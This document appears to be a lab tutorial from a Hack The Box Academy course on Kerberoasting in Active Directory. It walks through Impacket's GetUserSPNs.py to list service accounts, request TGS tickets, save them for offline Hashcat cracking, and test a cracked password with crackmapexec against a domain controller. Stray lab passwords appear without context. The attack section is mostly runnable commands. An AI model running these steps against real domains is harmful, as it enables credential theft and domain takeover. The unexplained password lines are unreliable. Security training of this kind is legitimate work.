## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Kerberoasting Overview](#Kerberoasting\Overview)
- [Performing The Kerberoasting attack](#performing\the\kerberoasting\attack)
      - [Installing Impacket using Pip](#Installing\Impacket\using\Pip)
      - [Listing GetUserSPNs.py Help Options](#Listing\GetUserSPNs.py\Help\Options)
      - [Listing SPN Accounts with GetUserSPNs.py](#Listing\SPN\Accounts\with\GetUserSPNs.py)
      - [Requesting all TGS Tickets](#Requesting\all\TGS\Tickets)
      - [Requesting a Single TGS ticket](#Requesting\a\Single\TGS\ticket)
      - [Saving the TGS Ticket to an Output File](#Saving\the\TGS\Ticket\to\an\Output\File)
      - [Testing Authentication against a Domain Controller](#Testing\Authentication\against\a\Domain\Controller)



Our enumeration up to this point has given us a broad picture of the domain and potential issues. We have enumerated user accounts and can see that some are configured with Service Principal Names. Let's see how we can leverage this to move laterally and escalate privileges in the target domain.

## Kerberoasting Overview

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. - **What It Is**: Kerberoasting is a technique used for lateral movement or privilege escalation in Active Directory (AD) environments.
    
- **Target**: Focuses on Service Principal Names (SPNs), which are unique identifiers for service instances in AD.
    
- **Why SPNs**: Service accounts running these SPNs often have elevated privileges, making them attractive targets.
    
- **Access Needed**: Minimal access is required to perform the attack—just a domain user account or SYSTEM level access on a domain-joined host.
    
- **How It Works**:
    
    1. Any domain user can request a Kerberos ticket for any SPN.
    2. The Kerberos ticket is encrypted with the service account's NTLM hash.
- **Attack Vector**:
    
    1. Retrieve the encrypted Kerberos ticket.
    2. Subject it to an offline brute-force attack to potentially obtain the cleartext password.
- **Tools**: Tools like Hashcat can be used for the brute-force attack.
    
- **Risks**:
    
    1. Service accounts are often local administrators or part of highly privileged domain groups.
    2. Can be used across forest trusts, increasing the attack surface.



# Performing The Kerberoasting attack
Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

#### Installing Impacket using Pip

  Installing Impacket using Pip

```shell
gdxqpardo@htb[/htb]$ sudo python3 -m pip install .
```


#### Listing GetUserSPNs.py Help Options

  Listing GetUserSPNs.py Help Options

```shell
gdxqpardo@htb[/htb]$ GetUserSPNs.py -h
```


We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.

#### Listing SPN Accounts with GetUserSPNs.py

  Listing SPN Accounts with GetUserSPNs.py

```shell
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

```

We can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.

#### Requesting all TGS Tickets

  Requesting all TGS Tickets

```shell
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

```

```shell-session
HTB_@cademy_stdnt!
```

```shell-session
Academy_student_AD!
```
Welcome2021
Spring@18
We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.
#### Requesting a Single TGS ticket

  Requesting a Single TGS ticket

```shell
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

```

To facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking

#### Saving the TGS Ticket to an Output File

  Saving the TGS Ticket to an Output File

```shell-session
gdxqpardo@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

```

Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_tgs`. Now we can attempt to crack the ticket offline using Hashcat hash mode `13100`.



#### Testing Authentication against a Domain Controller

  Testing Authentication against a Domain Controller

```shell
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```







